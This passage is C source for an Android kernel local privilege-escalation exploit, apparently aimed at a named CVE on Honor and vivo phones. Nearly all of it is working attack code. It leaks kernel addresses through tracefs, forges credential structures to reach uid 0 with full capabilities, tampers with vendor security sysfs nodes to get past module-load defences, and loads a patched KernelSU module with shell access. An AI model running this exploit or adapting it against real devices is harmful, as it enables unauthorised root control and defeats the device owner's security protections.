	e = c->h[4];
	f = c->h[5];
	g = c->h[6];
	h = c->h[7];
	for (i = 0; i < 64; i++) {
		uint32_t S1 = ROR32(e, 6) ^ ROR32(e, 11) ^ ROR32(e, 25);
		uint32_t ch = (e & f) ^ ((~e) & g);
		uint32_t S0 = ROR32(a, 2) ^ ROR32(a, 13) ^ ROR32(a, 22);
		uint32_t maj = (a & b) ^ (a & cc) ^ (b & cc);

		t1 = h + S1 + ch + sha256_k[i] + w[i];
		t2 = S0 + maj;
		h = g;
		g = f;
		f = e;
		e = d + t1;
		d = cc;
		cc = b;
		b = a;
		a = t1 + t2;
	}
	c->h[0] += a;
	c->h[1] += b;
	c->h[2] += cc;
	c->h[3] += d;
	c->h[4] += e;
	c->h[5] += f;
	c->h[6] += g;
	c->h[7] += h;
}

static void sha256_init(sha256_ctx *c)
{
	c->h[0] = 0x6a09e667;
	c->h[1] = 0xbb67ae85;
	c->h[2] = 0x3c6ef372;
	c->h[3] = 0xa54ff53a;
	c->h[4] = 0x510e527f;
	c->h[5] = 0x9b05688c;
	c->h[6] = 0x1f83d9ab;
	c->h[7] = 0x5be0cd19;
	c->bits = 0;
	c->n = 0;
}

static void sha256_update(sha256_ctx *c, const void *data, size_t len)
{
	const unsigned char *p = data;

	c->bits += (uint64_t)len * 8;
	while (len) {
		size_t take = 64 - c->n;

		if (take > len)
			take = len;
		memcpy(c->buf + c->n, p, take);
		c->n += take;
		p += take;
		len -= take;
		if (c->n == 64) {
			sha256_block(c, c->buf);
			c->n = 0;
		}
	}
}

static void sha256_final(sha256_ctx *c, unsigned char out[32])
{
	uint64_t bits = c->bits;
	unsigned char pad[72];
	size_t padlen;
	int i;

	pad[0] = 0x80;
	padlen = (c->n < 56) ? (56 - c->n) : (120 - c->n);
	memset(pad + 1, 0, padlen - 1);
	for (i = 0; i < 8; i++)
		pad[padlen + i] = (unsigned char)(bits >> (56 - i * 8));
	sha256_update(c, pad, padlen + 8);
	for (i = 0; i < 8; i++) {
		out[i * 4] = (unsigned char)(c->h[i] >> 24);
		out[i * 4 + 1] = (unsigned char)(c->h[i] >> 16);
		out[i * 4 + 2] = (unsigned char)(c->h[i] >> 8);
		out[i * 4 + 3] = (unsigned char)c->h[i];
	}
}

static void sha256_buf(const void *data, size_t len, unsigned char out[32])
{
	sha256_ctx c;

	sha256_init(&c);
	sha256_update(&c, data, len);
	sha256_final(&c, out);
}

/* ---- bsp_security sysfs helpers ---- */
static int bsp_read(const char *name, char *out, size_t cap)
{
	char path[128];
	int fd;
	ssize_t r;
	size_t n;

	snprintf(path, sizeof(path), "/sys/kernel/bsp_security/%s", name);
	if (!cap)
		return -1;
	out[0] = 0;
	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0) {
		logf("[bsp] read %s open errno=%d\n", name, errno);
		return -1;
	}
	r = read(fd, out, cap - 1);
	close(fd);
	if (r <= 0) {
		logf("[bsp] read %s errno=%d\n", name, errno);
		out[0] = 0;
		return -1;
	}
	out[r] = 0;
	n = strlen(out);
	while (n && (out[n - 1] == '\n' || out[n - 1] == '\r'))
		out[--n] = 0;
	return 0;
}

static int bsp_write(const char *name, const void *buf, size_t len)
{
	char path[128];
	int fd, e;
	ssize_t n;

	snprintf(path, sizeof(path), "/sys/kernel/bsp_security/%s", name);
	fd = open(path, O_WRONLY | O_CLOEXEC);
	if (fd < 0) {
		logf("[bsp] write %s open errno=%d\n", name, errno);
		return -1;
	}
	errno = 0;
	n = write(fd, buf, len);
	e = errno;
	close(fd);
	logf("[bsp] %s <= %zu bytes write=%zd errno=%d\n", name, len, n,
	     n == (ssize_t)len ? 0 : e);
	return n == (ssize_t)len ? 0 : -1;
}

static void bsp_probe_all(void)
{
	static const char *names[] = {
		"rem_authed", "em_authed", "vroot_authed", "unlocked",
		"compile_mode", "dbgfs_dfd_on", "kptr_dfd_on", "insko_dfd_on",
		"token_hwid", "vusb_msg", "write_hash", "khs_num", "def_on",
	};
	char v[300];
	size_t i;

	for (i = 0; i < sizeof(names) / sizeof(names[0]); i++) {
		if (bsp_read(names[i], v, sizeof(v)) == 0)
			logf("[bsp] %s = '%s'\n", names[i], v);
	}
}

/* ---- module image handling ---- */
static int build_ko_image(unsigned char **out, size_t *outlen)
{
	const char *path = "/data/local/tmp/kernelsu_patched.ko";
	struct stat st;
	unsigned char *img;
	uint64_t slide;
	ssize_t n;
	int fd;

	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0 || fstat(fd, &st) || st.st_size <= 0) {
		logf("[ko] open %s errno=%d\n", path, errno);
		if (fd >= 0)
			close(fd);
		return -1;
	}
	img = malloc((size_t)st.st_size);
	if (!img) {
		close(fd);
		return -1;
	}
	n = read(fd, img, (size_t)st.st_size);
	close(fd);
	if (n != st.st_size) {
		logf("[ko] read %zd/%ld\n", n, (long)st.st_size);
		free(img);
		return -1;
	}
	slide = read_slide_file();
	logf("[ko] size=%ld read=%zd slide=%#llx\n", (long)st.st_size, n,
	     (unsigned long long)slide);
	if (!slide) {
		logf("[ko] no slide\n");
		free(img);
		return -1;
	}
	(void)bind_ko_symbols(img, (size_t)st.st_size, slide);
	*out = img;
	*outlen = (size_t)st.st_size;
	return 0;
}

static int write_bound_file(unsigned char *img, size_t len)
{
	const char *path = "/data/local/tmp/ksu_bound.ko";
	ssize_t n;
	int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);

	if (fd < 0) {
		logf("[ko] bound open errno=%d\n", errno);
		return -1;
	}
	n = write(fd, img, len);
	close(fd);
	if (n != (ssize_t)len) {
		logf("[ko] bound write %zd/%zu errno=%d\n", n, len, errno);
		return -1;
	}
	return 0;
}

static void log_kmsg_tail(int kf, const char *tag)
{
	static char kb[65536];
	size_t used = 0;
	ssize_t m;

	if (kf < 0)
		return;
	while ((m = read(kf, kb + used, sizeof(kb) - 1 - used)) > 0) {
		used += (size_t)m;
		if (used > sizeof(kb) - 512)
			break;
	}
	kb[used] = 0;
	logf("[%s] kmsg(%zu):\n%.*s\n", tag, used,
	     (int)(used > 8000 ? 8000 : used),
	     kb + (used > 8000 ? used - 8000 : 0));
}

/* type: 0 = plain init_module/finit, 1 = allowlist prepared */
static int load_ko_now(unsigned char *img, size_t len, const char *tag)
{
	long r;
	int e1, e2 = 0;
	int kf;

	kf = open("/dev/kmsg", O_RDONLY | O_NONBLOCK | O_CLOEXEC);
	if (kf >= 0)
		(void)lseek(kf, 0, SEEK_END);
	errno = 0;
	r = syscall(SYS_init_module, img, (unsigned long)len, "allow_shell=1");
	e1 = errno;
	logf("[%s] init_module rc=%ld errno=%d uid=%d euid=%d\n", tag, r, e1,
	     (int)getuid(), (int)geteuid());
	if (r != 0) {
		int bf = open("/data/local/tmp/ksu_bound.ko",
			      O_RDONLY | O_CLOEXEC);

		if (bf >= 0) {
			errno = 0;
			r = syscall(SYS_finit_module, bf, "allow_shell=1", 0);
			e2 = errno;
			logf("[%s] finit_module rc=%ld errno=%d\n", tag, r, e2);
			close(bf);
		}
	}
	log_kmsg_tail(kf, tag);
	if (kf >= 0)
		close(kf);
	return module_loaded() ? 0 : -1;
}

static int insmod_race(void)
{
	unsigned char *img = NULL;
	size_t len = 0;
	int rc;

	if (build_ko_image(&img, &len))
		return -1;
	(void)write_bound_file(img, len);
	rc = load_ko_now(img, len, "race");
	free(img);
	return rc;
}

static int insmod_via_allowlist(void)
{
	unsigned char *img = NULL;
	unsigned char dg[32];
	unsigned char raw[8];
	size_t len = 0;
	char v[300];
	int rc = -1;

	if (build_ko_image(&img, &len))
		return -1;
	sha256_buf(img, len, dg);
	memcpy(raw, dg, 8);
	logf("[al] image sha256[0:8]=%02x%02x%02x%02x%02x%02x%02x%02x len=%zu\n",
	     dg[0], dg[1], dg[2], dg[3], dg[4], dg[5], dg[6], dg[7], len);

	if (bsp_read("insko_dfd_on", v, sizeof(v)) == 0)
		logf("[al] insko_dfd_on='%s'\n", v);
	else
		v[0] = 0;
	if (!strcmp(v, "1")) {
		logf("[al] insko_dfd_on=1 -> trying to clear it\n");
		(void)bsp_write("insko_dfd_on", "0\n", 2);
		if (bsp_read("insko_dfd_on", v, sizeof(v)) == 0)
			logf("[al] insko_dfd_on now='%s'\n", v);
	}
	if (!strcmp(v, "1")) {
		logf("[al] BLOCKED by g(7)=insko_dfd_on=1 (write-once)\n");
		goto out;
	}
	if (bsp_write("khs_num", "1\n", 2))
		goto out;
	if (bsp_read("khs_num", v, sizeof(v)) == 0)
		logf("[al] khs_num='%s'\n", v);
	if (bsp_write("write_hash", raw, sizeof(raw)))
		goto out;
	if (bsp_read("khs_num", v, sizeof(v)) == 0)
		logf("[al] khs_num now='%s'\n", v);
	(void)write_bound_file(img, len);
	rc = load_ko_now(img, len, "al");
out:
	free(img);
	return rc;
}

static int mod_present(const char *name)
{
	FILE *f = fopen("/proc/modules", "r");
	char line[256];
	size_t nl = strlen(name);
	int found = 0, count = 0, index = 0;

	if (!f) {
		logf("[race] /proc/modules open errno=%d uptime=%.2f\n", errno,
		     read_uptime());
		return -1;
	}
	while (fgets(line, sizeof(line), f)) {
		count++;
		if (!found && !strncmp(line, name, nl) && line[nl] == ' ') {
			found = 1;
			index = count;
		}
	}
	fclose(f);
	logf("[race] /proc/modules modules=%d %s=%d index=%d uptime=%.2f\n",
	     count, name, found, index, read_uptime());
	return found;
}

/* own126: read-only diagnostics for the "hooks_defend present" case.
 * The sysfs route is dead (insko_dfd_on sealed), so do not write anything. */
static void bsp_probe_key(void)
{
	char v[300];

	if (bsp_read("insko_dfd_on", v, sizeof(v)) == 0)
		logf("[bsp] insko_dfd_on = '%s'\n", v);
	if (bsp_read("def_on", v, sizeof(v)) == 0)
		logf("[bsp] def_on = '%s'\n", v);
	if (bsp_read("unlocked", v, sizeof(v)) == 0)
		logf("[bsp] unlocked = '%s'\n", v);
	if (bsp_read("vusb_msg", v, sizeof(v)) == 0)
		logf("[bsp] vusb_msg = '%s'\n", v);
	if (bsp_read("khs_num", v, sizeof(v)) == 0)
		logf("[bsp] khs_num = '%s'\n", v);
}

static int gate_main(void)
{
	int hk, ok = 0;

	logf("[gate127] start uid=%d euid=%d pid=%d uptime=%.2f\n",
	     (int)getuid(), (int)geteuid(), (int)getpid(), read_uptime());

	hk = mod_present("hooks_defend");
	if (hk != 0) {
		logf("[gate127] hooks_defend PRESENT -> kernel-write route\n");
		ok = (kernel_write_route() == 0);
		if (!ok)
			logf("[gate127] kernel-write route FAILED uptime=%.2f\n",
			     read_uptime());
	} else {
		logf("[gate127] hooks_defend ABSENT -> racing init_module\n");
		ok = (insmod_race() == 0);
		if (!ok)
			logf("[gate127] race init_module failed uptime=%.2f\n",
			     read_uptime());
	}
	if (ok)
		logf("[gate127] SUCCESS uptime=%.2f\n", read_uptime());
	logf("[gate127] done ok=%d uptime=%.2f\n", ok, read_uptime());
	for (;;)
		pause();
}

/* own85: try to load the KernelSU LKM straight from the fake-cred worker,
 * capture the kernel's own load_module diagnostics from /dev/kmsg. */
static int insmod_main(void)
{
	const char *path = "/data/local/tmp/kernelsu_patched.ko";
	int fd = open(path, O_RDONLY | O_CLOEXEC);
	struct stat st;
	unsigned char *img;
	ssize_t n;
	long r;
	int kf, e1, e2;

	if (fd < 0 || fstat(fd, &st) || st.st_size <= 0) {
		logf("[insmod] cannot open %s errno=%d\n", path, errno);
		return 1;
	}
	img = malloc((size_t)st.st_size);
	if (!img)
		return 1;
	n = read(fd, img, (size_t)st.st_size);
	logf("[insmod] %s size=%ld read=%ld\n", path, (long)st.st_size,
	     (long)n);
	if (n != st.st_size)
		return 1;
	{
		uint64_t slide = read_slide_file();

		logf("[insmod] slide from file=%#llx\n",
		     (unsigned long long)slide);
		if (!slide) {
			logf("[insmod] no slide; aborting\n");
			return 1;
		}
		if (bind_ko_symbols(img, (size_t)st.st_size, slide))
			logf("[insmod] symbol bind failed\n");
	}
	kf = open("/dev/kmsg", O_RDONLY | O_NONBLOCK | O_CLOEXEC);
	if (kf >= 0) {
		off_t e = lseek(kf, 0, SEEK_END);

		logf("[insmod] kmsg fd=%d seek_end=%ld\n", kf, (long)e);
	}
	errno = 0;
	r = syscall(SYS_init_module, img, (unsigned long)st.st_size,
		    "allow_shell=1");
	e1 = errno;
	logf("[insmod] init_module rc=%ld errno=%d\n", r, e1);
	errno = 0;
	r = syscall(SYS_finit_module, fd, "allow_shell=1", 0);
	e2 = errno;
	logf("[insmod] finit_module rc=%ld errno=%d\n", r, e2);
	if (kf >= 0) {
		static char kb[262144];
		size_t used = 0;
		ssize_t m;

		while ((m = read(kf, kb + used, sizeof(kb) - 1 - used)) > 0) {
			used += (size_t)m;
			if (used > sizeof(kb) - 8192)
				break;
		}
		kb[used] = 0;
		logf("[insmod] kmsg(%zu):\n%.*s\n", used,
		     (int)(used > 12000 ? 12000 : used),
		     kb + (used > 12000 ? used - 12000 : 0));
	}
	close(fd);
	logf("[insmod] done; parking\n");
	for (;;)
		pause();
}

int main(int argc, char **argv)
{
	int shell_mode = 0, leak_only = 0, check_only = 0, selftest = 0;
	int pointer_mode = MODE_ZERO;
	int fake_stage = 0;
	pid_t C = -1;
	int go_fd = -1, st_fd = -1;
	uint64_t R;
	struct plant_res r;

	setvbuf(stdout, NULL, _IONBF, 0);
	if (argc > 1 && !strcmp(argv[1], "insmod"))
		return insmod_main();
	if (argc > 1 && !strcmp(argv[1], "gate"))
		return gate_main();
	if (argc > 1 && !strcmp(argv[1], "wait")) {
		int mode = 0;

		if (argc > 3 && !strcmp(argv[3], "nofix"))
			g_child_nofix = 1;
		if (argc > 2 && !strcmp(argv[2], "shell"))
			mode = 1;
		else if (argc > 2 && !strcmp(argv[2], "daemon"))
			mode = 2;
		else if (argc > 2 && !strcmp(argv[2], "caps"))
			mode = 3;
		else if (argc > 2 && !strcmp(argv[2], "fake"))
			mode = 4;
		else if (argc > 2 && !strcmp(argv[2], "chain"))
			return chain_child_main();
		else if (argc > 2 && !strcmp(argv[2], "uid0"))
			return uid0_child_main();
		else if (argc > 2 && !strcmp(argv[2], "f6"))
			return f6_child_main();
		return wait_child_main(mode);
	}

	/* Dying while held zombies / a live fake-cred page exist lets init
	 * adopt and reap them, and the resulting rb_erase on freed memory
	 * panics the kernel. Park instead. */
	{
		static const int fatals[] = { SIGSEGV, SIGBUS, SIGFPE, SIGILL };
		struct sigaction sa;

		memset(&sa, 0, sizeof(sa));
		sa.sa_handler = fatal_sig_handler;
		sigemptyset(&sa.sa_mask);
		for (size_t i = 0; i < sizeof(fatals) / sizeof(fatals[0]); i++)
			(void)sigaction(fatals[i], &sa, NULL);
	}
	/* A second instance running while this one parks with held zombies is
	 * an uncontrolled-reap hazard. Nothing is held yet, so bail out. */
	{
		int lk = open("/data/local/tmp/.lock2",
			      O_CREAT | O_RDWR, 0600);

		if (lk >= 0 && flock(lk, LOCK_EX | LOCK_NB) != 0) {
			logf("[-] another instance holds the lock; exiting\n");
			return 1;
		}
	}
	(void)prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
	(void)signal(SIGPIPE, SIG_IGN);

	if (argc > 1 && !strcmp(argv[1], "shell"))
		shell_mode = 1;
	if (argc > 1 && !strcmp(argv[1], "daemon"))
		shell_mode = 2;
	if (argc > 1 && !strcmp(argv[1], "leak"))
		leak_only = 1;
	if (argc > 1 && !strcmp(argv[1], "check"))
		check_only = 1;
	if (argc > 1 && !strcmp(argv[1], "selftest"))
		selftest = 1;
	/* "fake": YuKongA's fake-cred + KernelSU late-load chain. */
	if (argc > 1 && !strcmp(argv[1], "fake")) {
		fake_stage = 1;
		g_fake_stage = 1;
		if (argc > 2 && !strcmp(argv[2], "fix"))
			g_fake_fix = 1;
		if (argc > 2 && !strcmp(argv[2], "nofix"))
			g_skip_fake_uid = 1;
		logf("[time] fake start pid=%d uptime=%.2f nofix=%d\n",
		     (int)getpid(), read_uptime(), g_skip_fake_uid);
	}
	if (argc > 1 && !strcmp(argv[1], "diag"))
		g_diag_stage = 1;
	if (argc > 1 && !strcmp(argv[1], "chain")) {
		g_chain_stage = 1;
		shell_mode = 5;
	}
	if (argc > 1 && !strcmp(argv[1], "uid0")) {
		g_uid0_stage = 1;
		shell_mode = 6;
	}
	if (argc > 1 && !strcmp(argv[1], "fake3")) {
		g_fake2_stage = 1;
		shell_mode = 5;	/* child: wait chain (report + KSU handoff) */
	}
	if (argc > 1 && !strcmp(argv[1], "fake5")) {
		g_fake5_stage = 1;
		shell_mode = 0;
	}
	if (argc > 1 && !strcmp(argv[1], "fake6")) {
		g_fake6_stage = 1;
		shell_mode = 7;
	}
	if (argc > 1 && !strcmp(argv[1], "fake7")) {
		g_fake7_stage = 1;
		shell_mode = 7;
	}
	if (argc > 1 && !strcmp(argv[1], "fake8")) {
		g_fake7_stage = 1;
		shell_mode = 7;
	}
	if (argc > 1 && !strcmp(argv[1], "fake9")) {
		g_fake9_stage = 1;
		shell_mode = 0;
	}
	if (argc > 1 && !strcmp(argv[1], "fake10")) {
		g_fake10_stage = 1;
		shell_mode = 7;
	}
	if (argc > 1 && !strcmp(argv[1], "xreuse")) {
		g_xreuse = 1;
		shell_mode = 0;
	}
	g_cpu = 0;
	if (argc > 2 && !strcmp(argv[1], "cpu"))
		g_cpu = atoi(argv[2]);

	g_raw_cap = 48u << 20;
	g_raw = malloc(g_raw_cap);
	g_evs = malloc(sizeof(*g_evs) * 400000);
	if (!g_raw || !g_evs) {
		logf("[-] alloc failed\n");
		return 1;
	}

	if (check_only) {
		(void)preflight();
		logf("[check] uid=%d euid=%d\n", (int)getuid(), (int)geteuid());
		logf("[check] tracefs=%s\n", access(TR "/trace", W_OK) ? "no" : "yes");
		logf("[check] raw-percpu=%s\n",
		     access(TR "/per_cpu/cpu0/trace_pipe_raw", R_OK) ? "no"
								    : "yes");
		logf("[check] trigger=%s\n",
		     access(TR "/events/kmem/rss_stat/trigger", W_OK) ? "no"
								     : "yes");
		aio_probe();
		pin(g_cpu);
		(void)wr(TR "/tracing_on", "0");
		(void)wr(TR "/buffer_size_kb", "4096");
		enable_events();
		ensure_raw();
		g_base = calibrate_base(g_evs);
		logf("[check] base=%#llx\n", (unsigned long long)g_base);
		logf("[check] %s\n", g_base ? "READY" : "NOT_READY");
		return g_base ? 0 : 1;
	}

	pin(g_cpu);
	logf("[+] pid=%d cpu=%d mode=%d\n", getpid(), g_cpu, shell_mode);
	logf("[+] target: CVE-2026-98260 uid-0 (Honor AAK-AN00, 6.6.118) (vivo X200s port))\n");
	(void)wr(TR "/tracing_on", "0");
	(void)wr(TR "/buffer_size_kb", "8192");
	enable_events();
	ensure_raw();

	g_base = calibrate_base(g_evs);
	if (!g_base) {
		logf("[-] base calibration failed\n");
		return 1;
	}
	logf("[+] direct map base=%#llx\n", (unsigned long long)g_base);

	R = leak_cred(&C, &go_fd, &st_fd, shell_mode);
	if (!R) {
		logf("[-] cred leak failed\n");
		return 1;
	}
	logf("[+] child=%d cred=%#llx target=%#llx\n", C,
	     (unsigned long long)R, (unsigned long long)(R + 8));
	if (leak_only) {
		close(go_fd);
		close(st_fd);
		kill(C, SIGKILL);
		waitpid(C, NULL, 0);
		logf("[+] leak-only run complete\n");
		return 0;
	}
	ensure_pool();
	ensure_raw();

	if (g_xreuse) {
		struct plant_res xr;

		memset(&xr, 0, sizeof(xr));
		run_plant(0, 1, &xr, 0, MODE_ZERO);
		logf("[xreuse] plant ok=%d retry=%d", xr.ok, xr.retry);
		for (;;) pause();
	}

	if (g_diag_stage) {
		struct plant_res dr;
		char line[256];
		char combuf[128] = {0};
		int fd, n;

		logf("[diag] child=%d task=%#llx comm_slot=%#llx\n", C,
		     (unsigned long long)g_child_task,
		     (unsigned long long)(g_child_task + OFF_TASK_COMM));
		memset(&dr, 0, sizeof(dr));
		run_plant(g_child_task + OFF_TASK_COMM, 1, &dr, 0, MODE_ZERO);
		logf("[diag] plant ok=%d V=%#llx A=%#llx\n", dr.ok,
		     (unsigned long long)dr.V, (unsigned long long)dr.A);
		snprintf(combuf, sizeof(combuf), "/proc/%d/comm", C);
		fd = open(combuf, O_RDONLY);
		if (fd >= 0) {
			n = (int)read(fd, combuf, sizeof(combuf) - 1);
			if (n > 0)
				combuf[n] = 0;
			else
				combuf[0] = 0;
			close(fd);
			logf("[diag] comm='%s'\n", combuf);
		} else {
			logf("[diag] comm open failed errno=%d\n", errno);
		}
		if (!read_status_line(C, "Name:", line, sizeof(line)))
			logf("[diag] status %s", line);
		if (!read_status_line(C, "Uid:", line, sizeof(line)))
			logf("[diag] status %s", line);
		logf("[diag] done\n");
		return 0;
	}

	if (g_fake5_stage) {
		struct plant_res pre, fp, rp;
		unsigned long long slide0 = 0, A = 0, TH = 0;
		int stable = 0, landed = 0;
		pid_t H;

		logf("[fake5] start\n");
		pin(g_cpu);
		trace_start();
		g_h_stack = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
				 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
		if (g_h_stack == MAP_FAILED) {
			logf("[fake5] stack mmap failed\n");
			return 0;
		}
		H = clone(fake5_helper, (char *)g_h_stack + HELPER_STACK,
			  CLONE_VM | SIGCHLD, NULL);
		if (H < 0) {
			logf("[fake5] clone failed errno=%d\n", errno);
			return 0;
		}
		usleep(200000);
		trace_stop();
		{
			int cnt = harvest(g_evs, 400000);

			TH = scan_task_allocs(g_evs, cnt, getpid());
		}
		logf("[fake5] helper=%d task=%#llx\n", (int)H,
		     (unsigned long long)TH);
		if (!TH) {
			logf("[fake5] task leak failed\n");
			return 0;
		}
		{
			unsigned long long prev = 0;

			for (int t = 0; t < 10 && !stable; t++) {
				unsigned long long s;
				struct plant_res cp;

				memset(&cp, 0, sizeof(cp));
				run_plant(TH + OFF_TASK_COMM, 1, &cp, 0,
					  MODE_ZERO);
				s = g_slide;
				logf("[fake5] comm%d ok=%d slide=%#llx\n", t,
				     cp.ok, s);
				if (s && !(s & 0x1fffffULL) &&
				    s >= 0x1000000000ULL &&
				    s <= 0x3000000000ULL) {
					if (prev == s) {
						slide0 = s;
						stable = 1;
						break;
					}
					prev = s;
				} else
					prev = 0;
			}
		}
		if (!stable) {
			logf("[fake5] no stable slide\n");
			return 0;
		}
		logf("[fake5] slide OK %#llx\n", (unsigned long long)slide0);
		for (int t = 0; t < 12 && !landed; t++) {
			int seq, w;

			memset(&fp, 0, sizeof(fp));
			run_plant(TH + OFF_TASK_CRED, 1, &fp, 0, MODE_FAKE);
			if (!fp.ok) {
				if (!fp.retry)
					park_forever("fake5 cred unsafe");
				continue;
			}
			if (g_slide != slide0) {
				logf("[fake5] drift %#llx\n",
				     (unsigned long long)g_slide);
				continue;
			}
			seq = atomic_fetch_add(&g_h_seq, 1) + 1;
			for (w = 0; w < 300 && g_h_seen != seq; w++)
				usleep(1000);
			logf("[fake5] try%d uid=%d euid=%d caps=%#llx seen=%d\n",
			     t, g_h_uid, g_h_euid,
			     (unsigned long long)g_h_caps, g_h_seen);
			if (g_h_caps == FULLCAP) {
				landed = 1;
				A = fp.A;
			}
		}
		if (!landed) {
			logf("[fake5] FAILED: fake cred not landed\n");
			return 0;
		}
		logf("[fake5] FAKE CRED LANDED A=%#llx slide=%#llx\n", A,
		     (unsigned long long)slide0);
		for (int t = 0; t < 8; t++) {
			int seq, w;

			memset(&rp, 0, sizeof(rp));
			run_plant(A + CRED_UID_OFF, 1, &rp, 0, MODE_ZERO);
			seq = atomic_fetch_add(&g_h_seq, 1) + 1;
			for (w = 0; w < 300 && g_h_seen != seq; w++)
				usleep(1000);
			logf("[fake5] repair%d uid=%d caps=%#llx\n", t,
			     g_h_uid, (unsigned long long)g_h_caps);
			if (g_h_uid == 0)
				break;
		}
		memset(&rp, 0, sizeof(rp));
		run_plant(A + CRED_UID_OFF + 8, 1, &rp, 0, MODE_ZERO);
		logf("[fake5] suid ok=%d\n", rp.ok);
		atomic_store(&g_h_load, 1);
		atomic_fetch_add(&g_h_seq, 1);
		for (int w = 0; w < 5000 && g_h_rc == -999; w++)
			usleep(1000);
		logf("[fake5] finit rc=%ld errno=%d uid=%d euid=%d caps=%#llx\n",
		     g_h_rc, g_h_errno, g_h_uid, g_h_euid,
		     (unsigned long long)g_h_caps);
		{
			FILE *mf = fopen("/proc/modules", "r");
			char ml[256];
			int live = 0;

			while (mf && fgets(ml, sizeof(ml), mf))
				if (!strncmp(ml, "kernelsu ", 9)) {
					live = 1;
					logf("[fake5] %s", ml);
				}
			if (mf)
				fclose(mf);
			logf("[fake5] kernelsu live=%d\n", live);
		}
		logf("[fake5] done\n");
		for (;;)
			pause();
	}

	if (g_fake7_stage) {
		struct child_report rep;
		struct plant_res pre, cp, bp;
		unsigned long long slide0 = 0, A = 0;
		int stable = 0, cap_ok = 0, sec_ok = 0;

		logf("[fake7] child=%d cred=%#llx sec=%#llx\n", C,
		     (unsigned long long)R, (unsigned long long)(R + 0x80));
		{
			unsigned long long prev = 0;

			for (int t = 0; t < 10 && !stable; t++) {
				unsigned long long s;

				memset(&pre, 0, sizeof(pre));
				run_plant(R + CRED_UID_OFF, 1, &pre, 0,
					  MODE_ZERO);
				s = g_slide;
				logf("[fake7] pre%d ok=%d slide=%#llx\n", t,
				     pre.ok, s);
				if (s && !(s & 0x1fffffULL) &&
				    s >= 0x1000000000ULL &&
				    s <= 0x3000000000ULL) {
					if (prev == s) {
						slide0 = s;
						stable = 1;
					} else
						prev = s;
				} else
					prev = 0;
			}
		}
		if (!stable) {
			logf("[fake7] no stable slide\n");
			return 0;
		}
		logf("[fake7] slide OK %#llx\n", (unsigned long long)slide0);
		for (int t = 0; t < 12 && !cap_ok; t++) {
			struct pollfd pf;
			ssize_t rn;

			memset(&cp, 0, sizeof(cp));
			run_plant(R + 0x40, 1, &cp, 0, MODE_PTR);
			if (!cp.ok) {
				if (!cp.retry)
					park_forever("fake7 cap unsafe");
				continue;
			}
			if (g_slide != slide0)
				continue;
			if (!((cp.A >> 16) & 1)) {
				logf("[fake7] cap A=%#llx b16=0\n",
				     (unsigned long long)cp.A);
				continue;
			}
			memset(&rep, 0, sizeof(rep));
			if (write(go_fd, "A", 1) != 1)
				break;
			pf.fd = st_fd;
			pf.events = POLLIN;
			rn = poll(&pf, 1, 4000) > 0
				     ? read(st_fd, &rep, sizeof(rep)) : -1;
			if (rn != (ssize_t)sizeof(rep) ||
			    rep.magic != CHILD_MAGIC) {
				logf("[fake7] cap no report rn=%zd\n", rn);
				break;
			}
			logf("[fake7] cap want=%#llx got=%#llx uid=%d\n",
			     (unsigned long long)cp.A,
			     (unsigned long long)rep.caps, rep.uid);
			if (rep.caps == cp.A) {
				cap_ok = 1;
				A = cp.A;
			}
		}
		if (!cap_ok) {
			logf("[fake7] cap failed\n");
			return 0;
		}
		logf("[fake7] CAP OK %#llx\n", A);
		for (int t = 0; t < 8; t++) {
			memset(&bp, 0, sizeof(bp));
			run_plant(R + 0x48, 1, &bp, 0, MODE_PTR);
			if (!bp.ok) {
				if (!bp.retry)
					park_forever("fake7 bset unsafe");
				continue;
			}
			if (g_slide == slide0 && ((bp.A >> 16) & 1)) {
				logf("[fake7] bset=%#llx\n",
				     (unsigned long long)bp.A);
				break;
			}
		}
		{
		logf("[fake8] W: child will finit in 30s\n");
		(void)!write(go_fd, "W", 1);
		sleep(1);
		for (int t = 0; t < 3; t++) {
			struct plant_res sp2;

			memset(&sp2, 0, sizeof(sp2));
			run_plant(R + 0x80, 1, &sp2, 0, MODE_BLOB);
			logf("[fake8] sec%d ok=%d A=%#llx\n", t, sp2.ok,
			     (unsigned long long)sp2.A);
			if (!sp2.ok && !sp2.retry)
				break;
			if (sp2.ok)
				sec_ok = 1;
		}
		logf("[fake8] SEC done ok=%d parent_alive=1\n", sec_ok);
			struct pollfd pf;
			ssize_t rn;

			memset(&rep, 0, sizeof(rep));
			if (write(go_fd, "A", 1) == 1) {
				pf.fd = st_fd;
				pf.events = POLLIN;
				rn = poll(&pf, 1, 4000) > 0
					     ? read(st_fd, &rep,
						    sizeof(rep)) : -1;
				if (rn == (ssize_t)sizeof(rep) &&
				    rep.magic == CHILD_MAGIC)
					logf("[fake7] post-sec uid=%d euid=%d caps=%#llx\n",
					     rep.uid, rep.euid,
					     (unsigned long long)rep.caps);
				else
					logf("[fake7] post-sec no report rn=%zd\n",
					     rn);
			}
		}
		logf("[fake7] G: finit_module\n");
		(void)!write(go_fd, "G", 1);
		for (int rr = 0; rr < 3; rr++) {
			struct pollfd pf = { .fd = st_fd, .events = POLLIN };

			memset(&rep, 0, sizeof(rep));
			if (poll(&pf, 1, 5000) > 0 &&
			    read(st_fd, &rep, sizeof(rep)) ==
				    (ssize_t)sizeof(rep) &&
			    rep.magic == CHILD_MAGIC)
				logf("[fake7] finit rc=%d errno=%d uid=%d caps=%#llx\n",
				     rep.setuid_ret, rep.setuid_errno,
				     rep.uid,
				     (unsigned long long)rep.caps);
			else
				break;
		}
		{
			FILE *mf = fopen("/proc/modules", "r");
			char ml[256];
			int live = 0;

			while (mf && fgets(ml, sizeof(ml), mf))
				if (!strncmp(ml, "kernelsu ", 9)) {
					live = 1;
					logf("[fake7] %s", ml);
				}
			if (mf)
				fclose(mf);
			logf("[fake7] kernelsu live=%d\n", live);
		}
		logf("[fake7] done\n");
		for (;;)
			pause();
	}

	if (g_fake9_stage) {
		struct child_report rep;
		struct plant_res pre, fp, rp;
		unsigned long long slide0 = 0, A = 0, TH = 0;
		int stable = 0, landed = 0;
		pid_t H = -1;

		logf("[fake9] start cred=%#llx\n", (unsigned long long)R);
		{
			unsigned long long prev = 0;

			for (int t = 0; t < 10 && !stable; t++) {
				unsigned long long s;

				memset(&pre, 0, sizeof(pre));
				run_plant(R + CRED_UID_OFF, 1, &pre, 0,
					  MODE_ZERO);
